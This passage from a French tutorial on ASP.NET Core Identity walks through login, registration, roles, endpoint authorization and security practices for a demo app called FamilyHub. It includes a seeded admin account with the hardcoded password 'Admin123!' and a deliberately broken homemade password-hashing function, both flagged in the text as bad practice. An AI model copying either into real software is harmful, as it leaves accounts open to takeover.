<h3>Connexion a FamilyHub</h3>

<EditForm Model="loginModel" OnValidSubmit="HandleLogin" FormName="login">
    <DataAnnotationsValidator />
    <ValidationSummary />

    @if (!string.IsNullOrEmpty(errorMessage))
    {
        <div class="alert alert-danger">@errorMessage</div>
    }

    <div class="mb-3">
        <label for="email" class="form-label">Email</label>
        <InputText id="email" @bind-Value="loginModel.Email" class="form-control" />
        <ValidationMessage For="() => loginModel.Email" />
    </div>

    <div class="mb-3">
        <label for="password" class="form-label">Mot de passe</label>
        <InputText id="password" @bind-Value="loginModel.Password"
                   type="password" class="form-control" />
        <ValidationMessage For="() => loginModel.Password" />
    </div>

    <div class="mb-3 form-check">
        <InputCheckbox @bind-Value="loginModel.RememberMe" class="form-check-input" id="rememberMe" />
        <label class="form-check-label" for="rememberMe">Se souvenir de moi</label>
    </div>

    <button type="submit" class="btn btn-primary">Se connecter</button>

    <div class="mt-3">
        <a href="/register">Pas encore de compte ? Inscrivez-vous</a>
    </div>

    <hr />
    <h5>Ou connectez-vous avec :</h5>
    <a href="/api/auth/external/Google" class="btn btn-outline-danger me-2">Google</a>
    <a href="/api/auth/external/GitHub" class="btn btn-outline-dark">GitHub</a>
</EditForm>

@code {
    private LoginModel loginModel = new();
    private string? errorMessage;

    private async Task HandleLogin()
    {
        var result = await SignInManager.PasswordSignInAsync(
            loginModel.Email, loginModel.Password,
            loginModel.RememberMe, lockoutOnFailure: true);

        if (result.Succeeded)
        {
            Navigation.NavigateTo("/tasks");
        }
        else if (result.IsLockedOut)
        {
            errorMessage = "Compte verrouille. Reessayez dans 15 minutes.";
        }
        else if (result.RequiresTwoFactor)
        {
            Navigation.NavigateTo("/login-2fa");
        }
        else
        {
            errorMessage = "Email ou mot de passe incorrect.";
        }
    }

    public class LoginModel
    {
        [Required(ErrorMessage = "L'email est requis")]
        [EmailAddress(ErrorMessage = "Format d'email invalide")]
        public string Email { get; set; } = "";

        [Required(ErrorMessage = "Le mot de passe est requis")]
        public string Password { get; set; } = "";

        public bool RememberMe { get; set; }
    }
}
```

### Page d'Inscription

```razor
@page "/register"
@using Microsoft.AspNetCore.Identity
@inject UserManager<FamilyHubUser> UserManager
@inject SignInManager<FamilyHubUser> SignInManager
@inject NavigationManager Navigation

<h3>Creer un compte FamilyHub</h3>

<EditForm Model="registerModel" OnValidSubmit="HandleRegister" FormName="register">
    <DataAnnotationsValidator />
    <ValidationSummary />

    @if (errors.Any())
    {
        <div class="alert alert-danger">
            <ul>
                @foreach (var error in errors)
                {
                    <li>@error</li>
                }
            </ul>
        </div>
    }

    <div class="row">
        <div class="col-md-6 mb-3">
            <label for="firstName" class="form-label">Prenom</label>
            <InputText id="firstName" @bind-Value="registerModel.FirstName" class="form-control" />
            <ValidationMessage For="() => registerModel.FirstName" />
        </div>
        <div class="col-md-6 mb-3">
            <label for="lastName" class="form-label">Nom</label>
            <InputText id="lastName" @bind-Value="registerModel.LastName" class="form-control" />
            <ValidationMessage For="() => registerModel.LastName" />
        </div>
    </div>

    <div class="mb-3">
        <label for="email" class="form-label">Email</label>
        <InputText id="email" @bind-Value="registerModel.Email" class="form-control" />
        <ValidationMessage For="() => registerModel.Email" />
    </div>

    <div class="mb-3">
        <label for="password" class="form-label">Mot de passe</label>
        <InputText id="password" @bind-Value="registerModel.Password"
                   type="password" class="form-control" />
        <ValidationMessage For="() => registerModel.Password" />
    </div>

    <div class="mb-3">
        <label for="confirmPassword" class="form-label">Confirmer le mot de passe</label>
        <InputText id="confirmPassword" @bind-Value="registerModel.ConfirmPassword"
                   type="password" class="form-control" />
        <ValidationMessage For="() => registerModel.ConfirmPassword" />
    </div>

    <button type="submit" class="btn btn-primary">S'inscrire</button>
    <a href="/login" class="btn btn-link">Deja un compte ?</a>
</EditForm>

@code {
    private RegisterModel registerModel = new();
    private List<string> errors = new();

    private async Task HandleRegister()
    {
        errors.Clear();

        if (registerModel.Password != registerModel.ConfirmPassword)
        {
            errors.Add("Les mots de passe ne correspondent pas.");
            return;
        }

        var user = new FamilyHubUser
        {
            UserName = registerModel.Email,
            Email = registerModel.Email,
            FirstName = registerModel.FirstName,
            LastName = registerModel.LastName
        };

        var result = await UserManager.CreateAsync(user, registerModel.Password);

        if (result.Succeeded)
        {
            // Assigner le role par defaut
            await UserManager.AddToRoleAsync(user, "FamilyMember");

            // Connecter l'utilisateur automatiquement
            await SignInManager.SignInAsync(user, isPersistent: false);
            Navigation.NavigateTo("/tasks");
        }
        else
        {
            errors.AddRange(result.Errors.Select(e => e.Description));
        }
    }

    public class RegisterModel
    {
        [Required(ErrorMessage = "Le prenom est requis")]
        [StringLength(50, ErrorMessage = "Le prenom ne doit pas depasser 50 caracteres")]
        public string FirstName { get; set; } = "";

        [Required(ErrorMessage = "Le nom est requis")]
        [StringLength(50, ErrorMessage = "Le nom ne doit pas depasser 50 caracteres")]
        public string LastName { get; set; } = "";

        [Required(ErrorMessage = "L'email est requis")]
        [EmailAddress(ErrorMessage = "Format d'email invalide")]
        public string Email { get; set; } = "";

        [Required(ErrorMessage = "Le mot de passe est requis")]
        [StringLength(100, MinimumLength = 8, ErrorMessage = "Le mot de passe doit contenir au moins 8 caracteres")]
        public string Password { get; set; } = "";

        [Required(ErrorMessage = "La confirmation est requise")]
        [Compare("Password", ErrorMessage = "Les mots de passe ne correspondent pas")]
        public string ConfirmPassword { get; set; } = "";
    }
}
```

---

## 6.3 Proteger les pages avec [Authorize]

```razor
@* Page protegee : seuls les utilisateurs connectes peuvent y acceder *@
@page "/tasks"
@attribute [Authorize]

<h3>Mes Taches</h3>
@* ... contenu de la page ... *@


@* Page restreinte aux admins *@
@page "/admin"
@attribute [Authorize(Roles = "Admin")]

<h3>Administration</h3>
@* ... contenu admin ... *@


@* Affichage conditionnel selon le role *@
<AuthorizeView>
    <Authorized>
        <p>Bienvenue, @context.User.Identity?.Name !</p>

        <AuthorizeView Roles="Admin">
            <Authorized>
                <a href="/admin" class="btn btn-warning">Administration</a>
            </Authorized>
        </AuthorizeView>
    </Authorized>
    <NotAuthorized>
        <p>Veuillez vous <a href="/login">connecter</a>.</p>
    </NotAuthorized>
</AuthorizeView>
```

---

## 6.4 Implementation de IUserContext avec les vrais claims

```csharp
// src/Api/Services/JwtUserContext.cs
using System.Security.Claims;
using TodoApp.Domain.Users;

namespace FamilyHub.Api.Services;

public class JwtUserContext : IUserContext
{
    private readonly IHttpContextAccessor _httpContextAccessor;
    private User? _cachedUser;

    public JwtUserContext(IHttpContextAccessor httpContextAccessor)
    {
        _httpContextAccessor = httpContextAccessor;
    }

    public User CurrentUser
    {
        get
        {
            if (_cachedUser != null) return _cachedUser;

            var principal = _httpContextAccessor.HttpContext?.User;

            if (principal?.Identity?.IsAuthenticated != true)
                return User.Unknown;

            var id = principal.FindFirstValue(ClaimTypes.NameIdentifier) ?? "Unknown";
            var firstName = principal.FindFirstValue(ClaimTypes.GivenName) ?? "Unknown";
            var lastName = principal.FindFirstValue(ClaimTypes.Surname) ?? "Unknown";

            _cachedUser = new User(id, firstName, lastName);

            // Mapper les roles
            if (principal.IsInRole("Admin"))
                _cachedUser.Roles |= Role.Administrator;
            if (principal.IsInRole("FamilyMember"))
                _cachedUser.Roles |= Role.Contributor;

            _cachedUser.SubscriptionLevel = principal.FindFirstValue("SubscriptionLevel");
            _cachedUser.Country = principal.FindFirstValue("Country");

            return _cachedUser;
        }
    }
}

// Enregistrement dans le DI
// services.AddScoped<IUserContext, JwtUserContext>();
```

---

## 6.5 Roles : Admin vs Family Member

```csharp
// Initialisation des roles au demarrage
public static class SeedData
{
    public static async Task InitializeRoles(IServiceProvider serviceProvider)
    {
        var roleManager = serviceProvider.GetRequiredService<RoleManager<IdentityRole>>();
        var userManager = serviceProvider.GetRequiredService<UserManager<FamilyHubUser>>();

        // Creer les roles
        string[] roles = { "Admin", "FamilyMember", "Guest" };
        foreach (var role in roles)
        {
            if (!await roleManager.RoleExistsAsync(role))
                await roleManager.CreateAsync(new IdentityRole(role));
        }

        // Creer un admin par defaut (a supprimer en production !)
        var adminEmail = "admin@familyhub.com";
        if (await userManager.FindByEmailAsync(adminEmail) == null)
        {
            var admin = new FamilyHubUser
            {
                UserName = adminEmail,
                Email = adminEmail,
                FirstName = "Admin",
                LastName = "FamilyHub",
                EmailConfirmed = true
            };

            await userManager.CreateAsync(admin, "Admin123!");
            await userManager.AddToRoleAsync(admin, "Admin");
        }
    }
}

// Dans Program.cs
using (var scope = app.Services.CreateScope())
{
    await SeedData.InitializeRoles(scope.ServiceProvider);
}
```

---

## 6.6 Securiser les endpoints API

```csharp
// src/Api/Endpoints/TasksEndpoint.cs - Version securisee
public static class TasksEndpoint
{
    public static IEndpointRouteBuilder MapTasks(this IEndpointRouteBuilder app)
    {
        var group = app.MapGroup("/tasks")
            .RequireAuthorization(); // Tous les endpoints necessitent une authentification

        group.MapGet("/", GetTasks);
        group.MapGet("/summary", GetTaskSummary);
        group.MapGet("/{id}", GetTaskDetail);
        group.MapPost("/", CreateTaskItem);

        // Endpoints restreints aux membres de la famille
        group.MapPut("/{id}/complete", CompleteTaskItem)
            .RequireAuthorization("FamilyMember");

        // Endpoints restreints aux admins
        group.MapDelete("/{id}", DeleteTaskItem)
            .RequireAuthorization("AdminOnly");

        return app;
    }
}
```

---

# PARTIE 7 - Bonnes pratiques securite

## 7.1 OWASP Authentication Cheat Sheet (resume)

L'OWASP (Open Web Application Security Project) publie des guides de bonnes pratiques. Voici les points essentiels pour l'authentification :

| Pratique | Description |
|----------|-------------|
| **Mots de passe** | Minimum 8 caracteres, idealement 12+. Accepter les passphrases |
| **Hashing** | Utiliser bcrypt, Argon2 ou PBKDF2. Jamais MD5 ou SHA1 seul |
| **Stockage** | Ne JAMAIS stocker de mots de passe en clair |
| **Transmission** | Toujours utiliser HTTPS/TLS |
| **Erreurs** | Messages generiques ("Email ou mot de passe incorrect") |
| **Verrouillage** | Verrouiller le compte apres 5-10 tentatives echouees |
| **2FA** | Proposer l'authentification a deux facteurs |
| **Sessions** | Regenerer l'ID de session apres connexion |
| **Logout** | Invalider la session cote serveur |
| **Reset** | Tokens a usage unique avec expiration courte |

---

## 7.2 Ne JAMAIS creer sa propre cryptographie

```csharp
// NE JAMAIS FAIRE CA :
public static string HashPassword(string password)
{
    // Votre propre algorithme "maison" = DANGER !
    var reversed = new string(password.Reverse().ToArray());
    var xored = reversed.Select(c => (char)(c ^ 42)).ToArray();
    return Convert.ToBase64String(Encoding.UTF8.GetBytes(new string(xored)));
}

// TOUJOURS UTILISER les outils eprouves :
// - ASP.NET Core Identity (gere automatiquement le hashing)
// - BCrypt.Net-Next (si vous devez hasher manuellement)
var hashedPassword = BCrypt.Net.BCrypt.HashPassword("MonMotDePasse", workFactor: 12);
var isValid = BCrypt.Net.BCrypt.Verify("MonMotDePasse", hashedPassword);
```

> **Regle d'or** : La cryptographie est un domaine extremement complexe. Meme les experts font des erreurs. Utilisez TOUJOURS des bibliotheques eprouvees et maintenues.

---

## 7.3 Rate Limiting sur les tentatives de login

```csharp
// Avec ASP.NET Core 7+ Rate Limiting middleware
builder.Services.AddRateLimiter(options =>
{
    // Limiter les tentatives de login : 5 par minute par IP
    options.AddFixedWindowLimiter("login", limiterOptions =>
    {
        limiterOptions.PermitLimit = 5;
        limiterOptions.Window = TimeSpan.FromMinutes(1);
        limiterOptions.QueueProcessingOrder = QueueProcessingOrder.OldestFirst;
        limiterOptions.QueueLimit = 0; // Pas de file d'attente, rejet immediat
    });

    options.RejectionStatusCode = StatusCodes.Status429TooManyRequests;
});

// Appliquer au endpoint de login
app.UseRateLimiter();

app.MapPost("/api/auth/login", Login)
    .RequireRateLimiting("login");
```

---

## 7.4 Politique de verrouillage de compte

```csharp
services.Configure<IdentityOptions>(options =>
{
    // Verrouillage progressif
    options.Lockout.DefaultLockoutTimeSpan = TimeSpan.FromMinutes(15);
    options.Lockout.MaxFailedAccessAttempts = 5;
    options.Lockout.AllowedForNewUsers = true;
});

// Gestion avancee du verrouillage
public async Task<IActionResult> Login(LoginRequest request)
{
    var user = await _userManager.FindByEmailAsync(request.Email);

    if (user == null)
    {
        // Message generique pour ne pas reveler si l'email existe
        return Unauthorized("Email ou mot de passe incorrect.");
    }

    // Verifier si le compte est verrouille
    if (await _userManager.IsLockedOutAsync(user))
    {
        var lockoutEnd = await _userManager.GetLockoutEndDateAsync(user);
        _logger.LogWarning("Tentative de connexion sur un compte verrouille : {Email}", request.Email);
        return Unauthorized("Compte verrouille. Reessayez plus tard.");
    }

    var result = await _signInManager.CheckPasswordSignInAsync(user, request.Password, lockoutOnFailure: true);

    if (!result.Succeeded)
    {
        _logger.LogWarning("Tentative de connexion echouee pour {Email}", request.Email);
        return Unauthorized("Email ou mot de passe incorrect.");
    }

    _logger.LogInformation("Connexion reussie pour {Email}", request.Email);
    // ... generer le token ...
}
```

---

## 7.5 Flux de reinitialisation de mot de passe securise

```
1. L'utilisateur clique "Mot de passe oublie"
2. L'utilisateur entre son email
3. Le serveur genere un token unique avec expiration (meme si l'email n'existe pas !)
4. Si l'email existe, envoyer un email avec un lien de reinitialisation
5. L'utilisateur clique sur le lien et entre un nouveau mot de passe
6. Le serveur verifie le token et met a jour le mot de passe
7. Tous les tokens de refresh existants sont revoques
8. L'utilisateur doit se reconnecter
```

```csharp
// Etape 1 : Demander la reinitialisation
public async Task<IActionResult> ForgotPassword(ForgotPasswordRequest request)
{
    var user = await _userManager.FindByEmailAsync(request.Email);

    // IMPORTANT : toujours repondre la meme chose, que l'email existe ou non !
    // Cela empeche l'enumeration des comptes
    if (user == null)
    {
        return Ok("Si un compte existe avec cet email, un lien de reinitialisation a ete envoye.");
    }

    var token = await _userManager.GeneratePasswordResetTokenAsync(user);
    var encodedToken = WebEncoders.Base64UrlEncode(Encoding.UTF8.GetBytes(token));
    var resetLink = $"https://familyhub.com/reset-password?email={request.Email}&token={encodedToken}";

    await _emailSender.SendEmailAsync(request.Email, "Reinitialisation de mot de passe",
        $"Cliquez ici pour reinitialiser votre mot de passe : <a href='{resetLink}'>Reinitialiser</a>");

    return Ok("Si un compte existe avec cet email, un lien de reinitialisation a ete envoye.");
}

// Etape 2 : Reinitialiser le mot de passe
public async Task<IActionResult> ResetPassword(ResetPasswordRequest request)
{
    var user = await _userManager.FindByEmailAsync(request.Email);
    if (user == null)
        return BadRequest("Demande invalide.");

    var decodedToken = Encoding.UTF8.GetString(WebEncoders.Base64UrlDecode(request.Token));
    var result = await _userManager.ResetPasswordAsync(user, decodedToken, request.NewPassword);

    if (result.Succeeded)
    {
        // Revoquer tous les refresh tokens existants
        await RevokeAllRefreshTokens(user.Id);

        // Mettre a jour le SecurityStamp (invalide tous les cookies existants)
        await _userManager.UpdateSecurityStampAsync(user);

        return Ok("Mot de passe reinitialise avec succes.");
    }

    return BadRequest(result.Errors.Select(e => e.Description));
}
```

---

## 7.6 Audit logging pour les evenements d'authentification

```csharp
// Service d'audit logging
public interface IAuthAuditLogger
{
    Task LogLoginSuccess(string userId, string ipAddress);
    Task LogLoginFailure(string email, string ipAddress, string reason);
    Task LogLogout(string userId);
    Task LogPasswordChange(string userId);
    Task LogPasswordReset(string email);
    Task LogAccountLocked(string email, string ipAddress);
    Task LogRoleChange(string userId, string role, string action);
}

public class AuthAuditLogger : IAuthAuditLogger
{
    private readonly ILogger<AuthAuditLogger> _logger;
    private readonly ApplicationDbContext _context;

    public async Task LogLoginSuccess(string userId, string ipAddress)
    {
        _logger.LogInformation(
            "LOGIN_SUCCESS | UserId: {UserId} | IP: {IpAddress} | Time: {Time}",
            userId, ipAddress, DateTime.UtcNow);

        await _context.AuditLogs.AddAsync(new AuditLog
        {
            EventType = "LOGIN_SUCCESS",
            UserId = userId,
            IpAddress = ipAddress,
            Timestamp = DateTime.UtcNow
        });
        await _context.SaveChangesAsync();
    }

    public async Task LogLoginFailure(string email, string ipAddress, string reason)
    {
        _logger.LogWarning(
            "LOGIN_FAILURE | Email: {Email} | IP: {IpAddress} | Reason: {Reason} | Time: {Time}",
            email, ipAddress, reason, DateTime.UtcNow);

        await _context.AuditLogs.AddAsync(new AuditLog
        {
            EventType = "LOGIN_FAILURE",
            Details = $"Email: {email}, Reason: {reason}",
            IpAddress = ipAddress,
            Timestamp = DateTime.UtcNow
        });
        await _context.SaveChangesAsync();
    }

    public async Task LogAccountLocked(string email, string ipAddress)
    {
        _logger.LogCritical(
            "ACCOUNT_LOCKED | Email: {Email} | IP: {IpAddress} | Time: {Time}",
            email, ipAddress, DateTime.UtcNow);

        // Envoyer une alerte a l'admin (optionnel)
    }
}
```

---

## 7.7 Gestion des sessions : bonnes pratiques

| Pratique | Explication |
|----------|-------------|
| **Duree de vie courte** | Access tokens : 15-30 min. Refresh tokens : 7 jours max |
| **Regenerer apres login** | Nouveau session ID apres chaque connexion reussie |
| **Invalidation cote serveur** | Pouvoir revoquer les sessions a tout moment |
| **Logout complet** | Supprimer le cookie ET invalider le token cote serveur |
| **Sliding expiration** | Renouveler la duree de vie si l'utilisateur est actif |
| **Detecter les anomalies** | IP differente, user-agent different = forcer la re-authentification |
| **Un seul appareil** (optionnel) | Deconnecter les autres sessions quand l'utilisateur se connecte |

```csharp
// Logout complet
public async Task<IActionResult> Logout()
{
    var userId = User.FindFirstValue(ClaimTypes.NameIdentifier);

    // 1. Revoquer tous les refresh tokens
    await _tokenService.RevokeAllUserTokens(userId!);

    // 2. Deconnecter d'Identity (supprimer les cookies)
    await _signInManager.SignOutAsync();

    // 3. Supprimer le cookie d'access token
    Response.Cookies.Delete("access_token");

    // 4. Logger l'evenement
    await _auditLogger.LogLogout(userId!);

    return Ok("Deconnecte avec succes.");
}
```

---

## Resume du module

```
┌─────────────────────────────────────────────────────────────────┐
│                    Module 06 - Resume                           │
│                                                                 │
│  1. Authentification ≠ Autorisation                             │
│     (badge d'entree ≠ droits d'acces)                          │
│                                                                 │
│  2. ASP.NET Core Identity                                       │
│     Framework complet pour gerer users, roles, claims           │
│                                                                 │
│  3. JWT (JSON Web Tokens)                                       │
│     Token signe = passeport numerique pour les APIs             │
│                                                                 │
│  4. OAuth 2.0 & OpenID Connect                                  │
│     Delegation d'authentification (Google, Microsoft)            │
│                                                                 │
│  5. Duende IdentityServer                                       │
│     Votre propre serveur d'identite pour SSO                    │
│                                                                 │
│  6. Integration FamilyHub                                       │
│     IUserContext connecte aux vrais claims utilisateur           │
│                                                                 │
│  7. Securite                                                    │
│     OWASP, rate limiting, audit logging, HTTPS                  │
└─────────────────────────────────────────────────────────────────┘
```

---

## Ressources supplementaires

- [Documentation officielle ASP.NET Core Identity](https://learn.microsoft.com/en-us/aspnet/core/security/authentication/identity)
- [JWT.io - Debugger et documentation JWT](https://jwt.io/)
- [OAuth 2.0 Simplified](https://www.oauth.com/)
- [OpenID Connect Specification](https://openid.net/connect/)
- [Duende IdentityServer Documentation](https://docs.duendesoftware.com/)
- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [Have I Been Pwned](https://haveibeenpwned.com/) - Verifier si vos identifiants ont ete compromis
- [NIST Digital Identity Guidelines](https://pages.nist.gov/800-63-3/)
